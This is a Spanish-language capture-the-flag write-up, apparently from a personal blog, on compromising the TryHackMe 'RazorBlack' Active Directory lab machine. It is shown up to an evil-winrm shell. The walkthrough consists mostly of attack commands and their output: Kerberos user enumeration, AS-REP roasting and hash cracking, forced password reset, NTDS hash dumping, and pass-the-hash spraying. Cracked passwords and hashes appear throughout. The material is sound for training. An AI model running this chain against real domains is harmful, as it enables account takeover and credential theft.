<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup TryHackMe RazorBlack</title>

  <meta name="description" content="Resolución de la máquina RazorBlack de la plataforma de TryHackMe">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup TryHackMe RazorBlack">
  <meta name="twitter:description" content="Resolución de la máquina RazorBlack de la plataforma de TryHackMe">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/tryhackme/razorblack.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup TryHackMe RazorBlack">
  <meta property="og:description" content="Resolución de la máquina RazorBlack de la plataforma de TryHackMe">
  <meta property="og:image" content="/images/tryhackme/razorblack.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/tryhackme/razorblack.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe RazorBlack" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/tryhackme" title="xchg2pwn" class="blog-button">TryHackMe</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#access-sbradley">Access - sbradley</a></li>
        <li><a href="#shell-lvetrova">Shell - lvetrova</a></li>
        <li><a href="#shell-xyan1d3">Shell - xyan1d3</a></li>
        <li><a href="#shell-administrator">Shell - Administrator</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">TryHackMe</h2>
    <picture><img src="/images/tryhackme/razorblack.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">RazorBlack</h2><br>
  </header>

<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente solo encontramos varios puertos abiertos, todos comunes en un <code class="language-plaintext highlighter-rouge">AD</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.235.231
Nmap scan report for 10.10.235.231
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49693/tcp open  unknown</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos hacer una petición a nivel de <code class="language-plaintext highlighter-rouge">SMB</code> donde ademas del nombre de la máquina encontramos el <code class="language-plaintext highlighter-rouge">dominio</code> al que se asocian los equipos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.235.231
</span><span class="az">SMB         </span><span class="p">10.10.235.231   445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  </span>
</code></pre></div></div><br>

<p class="plain-text">Para posibles proximos <code class="language-plaintext highlighter-rouge">ataques</code> o simplemente comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que sepa a donde apuntar con el <code class="language-plaintext highlighter-rouge">dominio</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="am">"10.10.235.231 raz0rblack.thm" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
</code></pre></div></div><br>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">2049</code> esta abierto asi que podemos listar todas las <code class="language-plaintext highlighter-rouge">monturas</code> disponibles en la maquina con <code class="language-plaintext highlighter-rouge">showmount</code>, existe una para todos con el nombre <code class="language-plaintext highlighter-rouge">/users</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ showmount</span><span class="p"> -e raz0rblack.thm
Export list for raz0rblack.thm:  
/users (everyone)</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">mount</code> como root podemos montar la montura <code class="language-plaintext highlighter-rouge">/users</code> en el directorio <code class="language-plaintext highlighter-rouge">/mnt</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo mount </span><span class="p">raz0rblack.thm:/users /mnt/  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora como <code class="language-plaintext highlighter-rouge">root</code> listamos los archivos en <code class="language-plaintext highlighter-rouge">/mnt</code>, en el encontramos un <code class="language-plaintext highlighter-rouge">txt</code> que contiene lo que parece una <code class="language-plaintext highlighter-rouge">flag</code>, ademas de un archivo <code class="language-plaintext highlighter-rouge">xlsx</code> de excel</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">/mnt </span><span class="ve">❯ ls</span><span class="p">
 employee_status.xlsx   sbradley.txt  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat</span><span class="p"> sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}  </span>
</code></pre></div></div><br>

<p class="plain-text">El archivo de <code class="language-plaintext highlighter-rouge">excel</code> simplemente contiene una lista de <code class="language-plaintext highlighter-rouge">usuarios</code> y sus roles</p>
<a href="/tryhackme/razorblack/1.png" target="_blank"><div><p><img src="/tryhackme/razorblack/1.png"></p></div></a>

<p class="plain-text">Un estandar que se suele usar en nombres de <code class="language-plaintext highlighter-rouge">usuarios</code> es usar la primera letra del primer <code class="language-plaintext highlighter-rouge">nombre</code> y el apellido por ejemplo <code class="language-plaintext highlighter-rouge">daven port</code> pasa a ser simplemente <code class="language-plaintext highlighter-rouge">dport</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">users.txt  
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin</span>
</code></pre></div></div><br>

<p class="plain-text">Teniendo esta lista de <code class="language-plaintext highlighter-rouge">usuarios</code> podemos comprobar con <code class="language-plaintext highlighter-rouge">kerbrute</code> cuales son validos a nivel de <code class="language-plaintext highlighter-rouge">dominio</code>, esto reduce nuestra lista a solo <code class="language-plaintext highlighter-rouge">3</code> usuarios <code class="language-plaintext highlighter-rouge">válidos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d raz0rblack.thm --dc raz0rblack.thm users.txt  

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/


>  Using KDC(s):
>   raz0rblack.thm:88
</span><span class="ve">
>  [+] VALID USERNAME:       twilliams@raz0rblack.thm
>  [+] VALID USERNAME:       lvetrova@raz0rblack.thm
>  [+] VALID USERNAME:       sbradley@raz0rblack.thm
</span><span class="p">>  Done! Tested 12 usernames (3 valid) in 0.160 seconds</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">users.txt  
lvetrova
twilliams
sbradley</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos una lista de <code class="language-plaintext highlighter-rouge">usuarios</code> validos, podemos probar un ataque <code class="language-plaintext highlighter-rouge">ASREPRoast</code> para ver si uno de ellos es vulnerable, al hacerlo <code class="language-plaintext highlighter-rouge">twilliams</code> nos devuelve su <code class="language-plaintext highlighter-rouge">hash</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">raz0rblack.thm/ -no-pass -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:fbc529788a44ef5c2609713e70f56267$cd563030f0ce7cda49a891e0ece22c039e77a97763c4286dffa642976a0b2e5582ad6d98eacda2c2c24264a8af7ce122f7f97a129a5be7331e307a563b85d63e1cf602ddd19abeae347e92bc9c5a40e81752dd308ba69e3a8feaa3a271b2ea53270700781d3557f1155f3b7a5eb87655cbfd3ba641a278ea948b80b58c4ecbb832f0b17c24a2ee42b620d8a0cccca200c4e3f50b88dec411f9e1055d73d2e779a9e424c1c3d59b1680514c0aff4671e0a459ef59783546875869374d3beb4a23cc839ed94272b6577cd89b715db9014b888fb3f31b213597bf6b7aaa23055a70182eab6579993337a647439f7b15e1d1  
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos crackearlo facilmente con <code class="language-plaintext highlighter-rouge">john</code> y ver la contraseña del usuario <code class="language-plaintext highlighter-rouge">twilliams</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">roastpotatoes</span><span class="p">    (</span><span class="am">$krb5asrep$23$twilliams@RAZ0RBLACK.THM</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> que son validas y listamos recursos compartidos en smb, tenemos permiso de <code class="language-plaintext highlighter-rouge">lectura</code> en algunos recursos por <code class="language-plaintext highlighter-rouge">defecto</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb raz0rblack.thm -u twilliams -p roastpotatoes --shares
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\twilliams:roastpotatoes 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">Enumerated shares
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">Share           Permissions     Remark
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">-----           -----------     ------
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">ADMIN$                          Remote Admin
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">C$                              Default share
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">IPC$            READ            Remote IPC
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">NETLOGON        READ            Logon server share 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">SYSVOL          READ            Logon server share 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">trash                           Files Pending for deletion</span>
</code></pre></div></div><br>

</section>

<section class="post" id="access-sbradley">
<br><h3 class="post-title">Access - sbradley</h3><br>

<p class="plain-text">Podemos probar esa contreaseña, hacia los otros usuarios, <code class="language-plaintext highlighter-rouge">sbradley</code> no devuelve que es incorrecta sino un <code class="language-plaintext highlighter-rouge">error</code> de que es necesario <code class="language-plaintext highlighter-rouge">cambiar</code> la contraseña</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb raz0rblack.thm -u users.txt -p roastpotatoes --continue-on-success
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\twilliams:roastpotatoes 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="sa">[-] </span><span class="p">raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE</span>
</code></pre></div></div><br>

<p class="plain-text">Usamos <code class="language-plaintext highlighter-rouge">smbpasswd</code> para cambiar la actual <code class="language-plaintext highlighter-rouge">contraseña</code> a una que sea facil como lo es <code class="language-plaintext highlighter-rouge">password123</code>, la contraseña de <code class="language-plaintext highlighter-rouge">sbradley</code> se cambia correctamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-smbpasswd </span><span class="p">raz0rblack.thm/sbradley:roastpotatoes@10.10.235.231 -newpass password123  
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.</span>
</code></pre></div></div><br>

<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y nos devuelve que son correctas, en los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> podemos ver que tenemos privilegio de <code class="language-plaintext highlighter-rouge">lectura</code> en <code class="language-plaintext highlighter-rouge">trash</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb raz0rblack.thm -u sbradley -p password123 --shares
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\sbradley:password123 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">Enumerated shares
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">Share           Permissions     Remark
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">-----           -----------     ------
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">ADMIN$                          Remote Admin
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">C$                              Default share
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">IPC$            READ            Remote IPC
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">NETLOGON        READ            Logon server share 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">SYSVOL          READ            Logon server share 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="am">trash           READ            Files Pending for deletion</span>
</code></pre></div></div><br>

<p class="plain-text">Nos conectamos al recurso <code class="language-plaintext highlighter-rouge">trash</code> con <code class="language-plaintext highlighter-rouge">smbclient</code> donde encontramos varios archivos existentes, con <code class="language-plaintext highlighter-rouge">mget</code> simplemente podemos descargar todos ellos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-smbclient </span><span class="p">raz0rblack.thm/sbradley:password123@10.10.235.231
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use trash
# ls
drw-rw-rw-          0  Tue Mar 16 02:01:28 2021 .
drw-rw-rw-          0  Tue Mar 16 02:01:28 2021 ..
-rw-rw-rw-       1340  Thu Feb 25 14:29:05 2021 chat_log_20210222143423.txt  
-rw-rw-rw-   18927164  Tue Mar 16 02:02:20 2021 experiment_gone_wrong.zip
-rw-rw-rw-         37  Sat Feb 27 14:24:21 2021 sbradley.txt
# mget *
[*] Downloading chat_log_20210222143423.txt
[*] Downloading experiment_gone_wrong.zip
[*] Downloading sbradley.txt
#</span>
</code></pre></div></div><br>

<p class="plain-text">Leamos los <code class="language-plaintext highlighter-rouge">txt</code>, el primero nos muestra una <code class="language-plaintext highlighter-rouge">flag</code> que ya habiamos visto antes, el segundo un log de un <code class="language-plaintext highlighter-rouge">chat</code> entre el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y <code class="language-plaintext highlighter-rouge">sbradley</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}

</span><span class="ve">❯ cat </span><span class="p">chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.  
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-lvetrova">
<br><h3 class="post-title">Shell - lvetrova</h3><br>

<p class="plain-text">Al intentar descomprimir el <code class="language-plaintext highlighter-rouge">zip</code> que descargamos antes nos pide una contraseña</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ unzip </span><span class="p">experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password:  </span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">zip2john</code> podemos crear un <code class="language-plaintext highlighter-rouge">hash</code> del zip y con <code class="language-plaintext highlighter-rouge">john</code> obtenemos la contraseña</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ zip2john </span><span class="p">experiment_gone_wrong.zip > hash

</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">electromagnetismo</span><span class="p"> (</span><span class="am">experiment_gone_wrong.zip</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con la contraseña podemos <code class="language-plaintext highlighter-rouge">unzipear</code> el comprimido el cual nos deja 2 archivos, <code class="language-plaintext highlighter-rouge">system.hive</code> y <code class="language-plaintext highlighter-rouge">ntds.dit</code> los cuales contienen información importante del dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ unzip </span><span class="p">experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password: electromagnetismo  
  inflating: system.hive
  inflating: ntds.dit</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">secretsdump</code> podemos en local dumpear todos hashes de los usuarios del <code class="language-plaintext highlighter-rouge">dominio</code>, con expresiones regulares obtenemos solo los <code class="language-plaintext highlighter-rouge">hashes NT</code>, en total <code class="language-plaintext highlighter-rouge">1866</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -system system.hive -ntds ntds.dit > dump  

</span><span class="ve">❯ grep</span><span class="p"> ::: dump | </span><span class="ve">awk</span><span class="am"> '{print $4}' </span><span class="p">FS=</span><span class="am">':' </span><span class="p">> hashes.txt  

</span><span class="ve">❯ wc </span><span class="p">-l hashes.txt
1866 hashes.txt</span>
</code></pre></div></div><br>

<p class="plain-text">De los 3 usuarios validos solo nos falta la contraseña de <code class="language-plaintext highlighter-rouge">lvetrova</code>, podemos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> probar si alguno de todos los <code class="language-plaintext highlighter-rouge">hashes</code> es válido, obtenemos su hash</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb raz0rblack.thm -u lvetrova -H hashes.txt
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:1afedc472d0fdfe07cd075d36804efd0 STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:42263cad4fc3f45816c340e684e2592a STATUS_LOGON_FAILURE 
.....................................................................................................................................
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:7b8b14a73d8a45249de2f5b0c225d515 STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:081af9630677a387f6f0a9bb17852602 STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ro">[-] </span><span class="p">raz0rblack.thm\lvetrova:c184a72ed800899bc1ff633778a89b5e STATUS_LOGON_FAILURE 
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos usar este para mediante un <code class="language-plaintext highlighter-rouge">passthehash</code> autenticarnos a la máquina como el usuario <code class="language-plaintext highlighter-rouge">lvetrova</code>, la autenticacion es válida tanto para smb como para <code class="language-plaintext highlighter-rouge">winrm</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">winrm raz0rblack.thm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:HAVEN-DC) (domain:raz0rblack.thm)
</span><span class="az">HTTP        </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="az">[*] </span><span class="p">http://raz0rblack.thm:5985/wsman
</span><span class="az">WINRM       </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d </span><span class="am">(Pwn3d!)  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> para obtener una powershell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ evil-winrm</span><span class="p"> -i raz0rblack.thm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d  
PS C:\Users\lvetrova\Documents> </span><span class="am">whoami</span><span class="p">
raz0rblack\lvetrova
PS C:\Users\lvetrova\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">En su directorio home encontramos un archivo <code class="language-plaintext highlighter-rouge">xml</code> con su nombre de usuario el cual contene una <code class="language-plaintext highlighter-rouge">cadena</code> bastante larga la cual es una <code class="language-plaintext highlighter-rouge">credencial</code> con PSCredential</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\lvetrova> </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\lvetrova

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
